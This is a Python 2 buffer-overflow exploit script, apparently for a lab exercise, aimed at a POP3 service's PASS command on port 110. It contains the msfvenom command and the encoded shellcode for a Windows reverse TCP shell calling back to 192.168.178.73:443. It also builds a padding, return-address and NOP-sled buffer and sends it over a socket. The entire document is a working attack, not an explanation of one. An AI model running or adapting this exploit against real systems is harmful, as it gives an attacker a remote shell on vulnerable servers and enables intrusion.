#!/usr/bin/python

import socket

#Create array of buffers
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.178.73 LPORT=443 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python

buf =  ""
buf += "\xba\xc5\x1f\x0e\xa1\xda\xd9\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x95\x11\xec"
buf += "\x54\xe9\xc6\x72\x96\x11\x17\x13\x1e\xf4\x26\x13\x44"
buf += "\x7d\x18\xa3\x0e\xd3\x95\x48\x42\xc7\x2e\x3c\x4b\xe8"
buf += "\x87\x8b\xad\xc7\x18\xa7\x8e\x46\x9b\xba\xc2\xa8\xa2"
buf += "\x74\x17\xa9\xe3\x69\xda\xfb\xbc\xe6\x49\xeb\xc9\xb3"
buf += "\x51\x80\x82\x52\xd2\x75\x52\x54\xf3\x28\xe8\x0f\xd3"
buf += "\xcb\x3d\x24\x5a\xd3\x22\x01\x14\x68\x90\xfd\xa7\xb8"
buf += "\xe8\xfe\x04\x85\xc4\x0c\x54\xc2\xe3\xee\x23\x3a\x10"
buf += "\x92\x33\xf9\x6a\x48\xb1\x19\xcc\x1b\x61\xc5\xec\xc8"
buf += "\xf4\x8e\xe3\xa5\x73\xc8\xe7\x38\x57\x63\x13\xb0\x56"
buf += "\xa3\x95\x82\x7c\x67\xfd\x51\x1c\x3e\x5b\x37\x21\x20"
buf += "\x04\xe8\x87\x2b\xa9\xfd\xb5\x76\xa6\x32\xf4\x88\x36"
buf += "\x5d\x8f\xfb\x04\xc2\x3b\x93\x24\x8b\xe5\x64\x4a\xa6"
buf += "\x52\xfa\xb5\x49\xa3\xd3\x71\x1d\xf3\x4b\x53\x1e\x98"
buf += "\x8b\x5c\xcb\x0f\xdb\xf2\xa4\xef\x8b\xb2\x14\x98\xc1"
buf += "\x3c\x4a\xb8\xea\x96\xe3\x53\x11\x71\xcc\x0c\xab\xc8"
buf += "\xa4\x4e\xcb\xcb\x8f\xc6\x2d\xa1\xff\x8e\xe6\x5e\x99"
buf += "\x8a\x7c\xfe\x66\x01\xf9\xc0\xed\xa6\xfe\x8f\x05\xc2"
buf += "\xec\x78\xe6\x99\x4e\x2e\xf9\x37\xe6\xac\x68\xdc\xf6"
buf += "\xbb\x90\x4b\xa1\xec\x67\x82\x27\x01\xd1\x3c\x55\xd8"
buf += "\x87\x07\xdd\x07\x74\x89\xdc\xca\xc0\xad\xce\x12\xc8"
buf += "\xe9\xba\xca\x9f\xa7\x14\xad\x49\x06\xce\x67\x25\xc0"
buf += "\x86\xfe\x05\xd3\xd0\xfe\x43\xa5\x3c\x4e\x3a\xf0\x43"
buf += "\x7f\xaa\xf4\x3c\x9d\x4a\xfa\x97\x25\x6a\x19\x3d\x50"
buf += "\x03\x84\xd4\xd9\x4e\x37\x03\x1d\x77\xb4\xa1\xde\x8c"
buf += "\xa4\xc0\xdb\xc9\x62\x39\x96\x42\x07\x3d\x05\x62\x02"


nopsled = "\x90" * 20

buffer="A" * 2606 + "\x8f\x35\x4a\x5f" + nopsled + buf + "C" * (4000-2610-len(nopsled)-len(buf))


print "Fussing %s characters " % len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.178.76', 110))
s.recv(1024)
s.send("USER test\r\n")
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
